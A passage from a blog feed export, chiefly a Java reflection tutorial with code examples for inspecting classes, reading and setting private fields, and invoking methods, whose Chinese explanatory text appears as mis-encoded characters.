href="#Parsing-Module" class="headerlink" title="Parsing Module"></a>Parsing Module</h3><p>å……å½“æ”¯æŒæ¥å£ï¼Œèƒ½å¤Ÿæœ‰æ•ˆåœ°å¤„ç†ç”¨æˆ·ä¸å…¶ä»–ä¸¤ä¸ªæ ¸å¿ƒå­æ¨¡å—ä¹‹é—´äº¤æ¢çš„è‡ªç„¶è¯­è¨€ä¿¡æ¯ã€‚</p><p><a href="https://www.youtube.com/watch?v=h0k6kWWaCEU">https://www.youtube.com/watch?v=h0k6kWWaCEU</a></p><p>çœ‹äº†ä¸‹ä»–ä»¬çš„æµ‹è¯•è§†é¢‘ æ„Ÿè§‰ä¼¼ä¹å¾ˆä¸€èˆ¬å•Š</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®ºæ–‡ç²¾è¯» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Javaå¼€å‘ã€‘Java åå°„æœºåˆ¶</title>
      <link href="/2024/12/20/code/javareflection/"/>
      <url>/2024/12/20/code/javareflection/</url>
      
        <content type="html"><![CDATA[<h2 id="Classç±»"><a href="#Classç±»" class="headerlink" title="Classç±»"></a>Classç±»</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reflection</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        printClassInfo(<span class="string">&quot;&quot;</span>.getClass());</span><br><span class="line">        printClassInfo(Runnable.class);</span><br><span class="line">        printClassInfo(java.time.Month.class);</span><br><span class="line">        printClassInfo(String[].class);</span><br><span class="line">        printClassInfo(<span class="type">int</span>.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printClassInfo</span><span class="params">(Class cls)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Class name: &quot;</span> + cls.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;Simple name: &quot;</span> + cls.getSimpleName());</span><br><span class="line">        <span class="keyword">if</span> (cls.getPackage() != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Package name: &quot;</span> + cls.getPackage().getName());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;is interface: &quot;</span> + cls.isInterface());</span><br><span class="line">        System.out.println(<span class="string">&quot;is enum: &quot;</span> + cls.isEnum());</span><br><span class="line">        System.out.println(<span class="string">&quot;is array: &quot;</span> + cls.isArray());</span><br><span class="line">        System.out.println(<span class="string">&quot;is primitive: &quot;</span> + cls.isPrimitive());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JVMä¸ºæ¯ä¸ªåŠ è½½çš„classåŠinterfaceåˆ›å»ºäº†å¯¹åº”çš„Classå®ä¾‹æ¥ä¿å­˜classåŠinterfaceçš„æ‰€æœ‰ä¿¡æ¯ï¼›<br>è·å–ä¸€ä¸ªclasså¯¹åº”çš„Classå®ä¾‹åï¼Œå°±å¯ä»¥è·å–è¯¥classçš„æ‰€æœ‰ä¿¡æ¯ï¼›<br>é€šè¿‡Classå®ä¾‹è·å–classä¿¡æ¯çš„æ–¹æ³•ç§°ä¸ºåå°„ï¼ˆReflectionï¼‰ï¼›<br>JVMæ€»æ˜¯åŠ¨æ€åŠ è½½classï¼Œå¯ä»¥åœ¨è¿è¡ŒæœŸæ ¹æ®æ¡ä»¶æ¥æ§åˆ¶åŠ è½½classã€‚</p><h2 id="è®¿é—®å­—æ®µ"><a href="#è®¿é—®å­—æ®µ" class="headerlink" title="è®¿é—®å­—æ®µ"></a>è®¿é—®å­—æ®µ</h2><p>å¯¹ä»»æ„çš„ä¸€ä¸ªObjectå®ä¾‹ï¼Œåªè¦æˆ‘ä»¬è·å–äº†å®ƒçš„Classï¼Œå°±å¯ä»¥è·å–å®ƒçš„ä¸€åˆ‡ä¿¡æ¯ã€‚</p><ul><li>Field getField(name)ï¼šæ ¹æ®å­—æ®µåè·å–æŸä¸ªpublicçš„fieldï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰</li><li>Field getDeclaredField(name)ï¼šæ ¹æ®å­—æ®µåè·å–å½“å‰ç±»çš„æŸä¸ªfieldï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰</li><li>Field[] getFields()ï¼šè·å–æ‰€æœ‰publicçš„fieldï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰</li><li>Field[] getDeclaredFields()ï¼šè·å–å½“å‰ç±»çš„æ‰€æœ‰fieldï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reflection</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">stdClass</span> <span class="operator">=</span> Student.class;</span><br><span class="line">        <span class="comment">// è·å–publicå­—æ®µ&quot;score&quot;:</span></span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;score&quot;</span>));</span><br><span class="line">        <span class="comment">// è·å–ç»§æ‰¿çš„publicå­—æ®µ&quot;name&quot;:</span></span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        <span class="comment">// è·å–privateå­—æ®µ&quot;grade&quot;:</span></span><br><span class="line">        System.out.println(stdClass.getDeclaredField(<span class="string">&quot;grade&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>ä»¥Stringç±»çš„valueå­—æ®µä¸ºä¾‹ï¼Œå®ƒçš„å®šä¹‰æ˜¯ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">String</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">byte</span>[] value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å­—æ®µä¿¡æ¯</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> String.class.getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">f.getName(); <span class="comment">// &quot;value&quot;</span></span><br><span class="line">f.getType(); <span class="comment">// class [B è¡¨ç¤ºbyte[]ç±»å‹</span></span><br><span class="line"><span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> f.getModifiers();</span><br><span class="line">Modifier.isFinal(m); <span class="comment">// true</span></span><br><span class="line">Modifier.isPublic(m); <span class="comment">// false</span></span><br><span class="line">Modifier.isProtected(m); <span class="comment">// false</span></span><br><span class="line">Modifier.isPrivate(m); <span class="comment">// true</span></span><br><span class="line">Modifier.isStatic(m); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>é€šè¿‡åå°„è·å–å¯¹è±¡çš„å­—æ®µå€¼å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³•:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reflection</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Xiao Ming&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> p.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> f.get(p);</span><br><span class="line">        System.out.println(value); <span class="comment">// &quot;Xiao Ming&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>è¿è¡Œä»£ç ï¼Œå¦‚æœä¸å‡ºæ„å¤–ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªIllegalAccessExceptionï¼Œè¿™æ˜¯å› ä¸ºnameè¢«å®šä¹‰ä¸ºä¸€ä¸ªprivateå­—æ®µï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼ŒMainç±»æ— æ³•è®¿é—®Personç±»çš„privateå­—æ®µã€‚è¦ä¿®å¤é”™è¯¯ï¼Œå¯ä»¥å°†privateæ”¹ä¸ºpublicï¼Œæˆ–è€…ï¼Œåœ¨è°ƒç”¨Object value &#x3D; f.get(p);å‰ï¼Œå…ˆå†™ä¸€å¥ï¼š<code>f.setAccessible(true);</code><br>setAccessible(true)å¯èƒ½ä¼šå¤±è´¥ã€‚å¦‚æœJVMè¿è¡ŒæœŸå­˜åœ¨SecurityManagerï¼Œé‚£ä¹ˆå®ƒä¼šæ ¹æ®è§„åˆ™è¿›è¡Œæ£€æŸ¥ï¼Œæœ‰å¯èƒ½é˜»æ­¢setAccessible(true)ã€‚ä¾‹å¦‚ï¼ŒæŸä¸ªSecurityManagerå¯èƒ½ä¸å…è®¸å¯¹javaå’Œjavaxå¼€å¤´çš„packageçš„ç±»è°ƒç”¨setAccessible(true)ï¼Œè¿™æ ·å¯ä»¥ä¿è¯JVMæ ¸å¿ƒåº“çš„å®‰å…¨ã€‚</li></ul><p>å¯ä»¥é€šè¿‡setæ–¹æ³•è®¾ç½®å­—æ®µçš„å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reflection</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Xiao Ming&quot;</span>);</span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Xiao Ming&quot;</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> p.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(p, <span class="string">&quot;Xiao Hong&quot;</span>);</span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Xiao Hong&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è°ƒç”¨æ–¹æ³•"><a href="#è°ƒç”¨æ–¹æ³•" class="headerlink" title="è°ƒç”¨æ–¹æ³•"></a>è°ƒç”¨æ–¹æ³•</h2><p>Classç±»æä¾›äº†ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•æ¥è·å–Methodï¼š</p><ul><li>Method getMethod(name, Classâ€¦)ï¼šè·å–æŸä¸ªpublicçš„Methodï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰</li><li>Method getDeclaredMethod(name, Classâ€¦)ï¼šè·å–å½“å‰ç±»çš„æŸä¸ªMethodï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰</li><li>Method[] getMethods()ï¼šè·å–æ‰€æœ‰publicçš„Methodï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰</li><li>Method[] getDeclaredMethods()ï¼šè·å–å½“å‰ç±»çš„æ‰€æœ‰Methodï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reflection</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">stdClass</span> <span class="operator">=</span> Student.class;</span><br><span class="line">        <span class="comment">// è·å–publicæ–¹æ³•getScoreï¼Œå‚æ•°ä¸ºString:</span></span><br><span class="line">        System.out.println(stdClass.getMethod(<span class="string">&quot;getScore&quot;</span>, String.class));</span><br><span class="line">        <span class="comment">// è·å–ç»§æ‰¿çš„publicæ–¹æ³•getNameï¼Œæ— å‚æ•°:</span></span><br><span class="line">        System.out.println(stdClass.getMethod(<span class="string">&quot;getName&quot;</span>));</span><br><span class="line">        <span class="comment">// è·å–privateæ–¹æ³•getGradeï¼Œå‚æ•°ä¸ºint:</span></span><br><span class="line">        System.out.println(stdClass.getDeclaredMethod(<span class="string">&quot;getGrade&quot;</span>, <span class="type">int</span>.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getScore</span><span class="params">(String type)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getGrade</span><span class="params">(<span class="type">int</span> year)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>è¾“å‡ºç±»ä¼¼ä¸‹é¢çš„:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public int Student.getScore(java.lang.String)</span><br><span class="line">public java.lang.String Person.getName()</span><br><span class="line">private int Student.getGrade(int)</span><br></pre></td></tr></table></figure>ä¸€ä¸ªMethodå¯¹è±¡åŒ…å«ä¸€ä¸ªæ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼š</li><li>getName()ï¼šè¿”å›æ–¹æ³•åç§°ï¼Œä¾‹å¦‚ï¼šâ€getScoreâ€ï¼›</li><li>getReturnType()ï¼šè¿”å›æ–¹æ³•è¿”å›å€¼ç±»å‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªClasså®ä¾‹ï¼Œä¾‹å¦‚ï¼šString.classï¼›</li><li>getParameterTypes()ï¼šè¿”å›æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼Œæ˜¯ä¸€ä¸ªClassæ•°ç»„ï¼Œä¾‹å¦‚ï¼š{String.class, int.class}ï¼›</li><li>getModifiers()ï¼šè¿”å›æ–¹æ³•çš„ä¿®é¥°ç¬¦ï¼Œå®ƒæ˜¯ä¸€ä¸ªintï¼Œä¸åŒçš„bitè¡¨ç¤ºä¸åŒçš„å«ä¹‰ã€‚</li></ul><h3 id="è°ƒç”¨æ–¹æ³•-1"><a href="#è°ƒç”¨æ–¹æ³•-1" class="headerlink" title="è°ƒç”¨æ–¹æ³•"></a>è°ƒç”¨æ–¹æ³•</h3><p>å½“æˆ‘ä»¬è·å–åˆ°ä¸€ä¸ªMethodå¯¹è±¡æ—¶ï¼Œå°±å¯ä»¥å¯¹å®ƒè¿›è¡Œè°ƒç”¨ã€‚æˆ‘ä»¬ä»¥ä¸‹é¢çš„ä»£ç ä¸ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">r</span> <span class="operator">=</span> s.substring(<span class="number">6</span>); <span class="comment">// &quot;world&quot;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœç”¨åå°„æ¥è°ƒç”¨substringæ–¹æ³•ï¼Œéœ€è¦ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reflection</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Stringå¯¹è±¡:</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line">        <span class="comment">// è·å–String substring(int)æ–¹æ³•ï¼Œå‚æ•°ä¸ºint:</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> String.class.getMethod(<span class="string">&quot;substring&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">// åœ¨så¯¹è±¡ä¸Šè°ƒç”¨è¯¥æ–¹æ³•å¹¶è·å–ç»“æœ:</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">r</span> <span class="operator">=</span> (String) m.invoke(s, <span class="number">6</span>);</span><br><span class="line">        <span class="comment">// æ‰“å°è°ƒç”¨ç»“æœ:</span></span><br><span class="line">        System.out.println(r); <span class="comment">// &quot;world&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨æ„åˆ°substring()æœ‰ä¸¤ä¸ªé‡è½½æ–¹æ³•ï¼Œæˆ‘ä»¬è·å–çš„æ˜¯String substring(int)è¿™ä¸ªæ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment">// è·å–String substring(int, int)æ–¹æ³•ï¼Œå‚æ•°ä¸ºä¸¤ä¸ªint:</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> String.class.getMethod(<span class="string">&quot;substring&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="comment">// åœ¨så¯¹è±¡ä¸Šè°ƒç”¨è¯¥æ–¹æ³•å¹¶è·å–ç»“æœ:</span></span><br><span class="line"><span class="type">String</span> <span class="variable">r</span> <span class="operator">=</span> (String) m.invoke(s, <span class="number">6</span>, <span class="number">11</span>); <span class="comment">// ä½¿ç”¨6å’Œ11æ¥è·å–&quot;world&quot;</span></span><br></pre></td></tr></table></figure><h3 id="è°ƒç”¨é™æ€æ–¹æ³•"><a href="#è°ƒç”¨é™æ€æ–¹æ³•" class="headerlink" title="è°ƒç”¨é™æ€æ–¹æ³•"></a>è°ƒç”¨é™æ€æ–¹æ³•</h3><p>å¦‚æœè·å–åˆ°çš„Methodè¡¨ç¤ºä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œè°ƒç”¨é™æ€æ–¹æ³•æ—¶ï¼Œç”±äºæ— éœ€æŒ‡å®šå®ä¾‹å¯¹è±¡ï¼Œæ‰€ä»¥invokeæ–¹æ³•ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ°¸è¿œä¸ºnullã€‚æˆ‘ä»¬ä»¥Integer.parseInt(String)ä¸ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// è·å–Integer.parseInt(String)æ–¹æ³•ï¼Œå‚æ•°ä¸ºString:</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> Integer.class.getMethod(<span class="string">&quot;parseInt&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// è°ƒç”¨è¯¥é™æ€æ–¹æ³•å¹¶è·å–ç»“æœ:</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> (Integer) m.invoke(<span class="literal">null</span>, <span class="string">&quot;12345&quot;</span>);</span><br><span class="line">        <span class="comment">// æ‰“å°è°ƒç”¨ç»“æœ:</span></span><br><span class="line">        System.out.println(n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è°ƒç”¨épublicæ–¹æ³•"><a href="#è°ƒç”¨épublicæ–¹æ³•" class="headerlink" title="è°ƒç”¨épublicæ–¹æ³•"></a>è°ƒç”¨épublicæ–¹æ³•</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> p.getClass().getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m.invoke(p, <span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">        System.out.println(p.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>setAccessible(true)å¯èƒ½ä¼šå¤±è´¥ã€‚å¦‚æœJVMè¿è¡ŒæœŸå­˜åœ¨SecurityManagerï¼Œé‚£ä¹ˆå®ƒä¼šæ ¹æ®è§„åˆ™è¿›è¡Œæ£€æŸ¥ï¼Œæœ‰å¯èƒ½é˜»æ­¢setAccessible(true)ã€‚ä¾‹å¦‚ï¼ŒæŸä¸ªSecurityManagerå¯èƒ½ä¸å…è®¸å¯¹javaå’Œjavaxå¼€å¤´çš„packageçš„ç±»è°ƒç”¨setAccessible(true)ï¼Œè¿™æ ·å¯ä»¥ä¿è¯JVMæ 